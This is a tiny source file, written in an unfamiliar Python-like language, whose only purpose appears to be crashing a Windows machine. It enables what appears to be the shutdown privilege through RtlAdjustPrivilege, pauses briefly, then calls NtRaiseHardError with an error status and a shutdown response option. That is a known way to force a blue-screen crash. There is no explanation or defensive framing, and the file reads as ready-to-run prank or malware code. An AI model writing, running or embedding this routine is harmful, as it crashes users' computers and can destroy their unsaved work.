extern def Sleep(ms: u32) -> void
extern def RtlAdjustPrivilege(Privilege: u32, Enable: i32, CurrentThread: i32, Enabled: *i32) -> u32
extern def NtRaiseHardError(Status: u32, Params: u32, Mask: u32, Ptr: u64, Opt: u32, Res: *u32) -> u32

def main() -> int:
    RtlAdjustPrivilege(19, 1, 0, 0)
    Sleep(1000)
    NtRaiseHardError(3221225473, 0, 0, 0, 6, 0)
    
    endofcode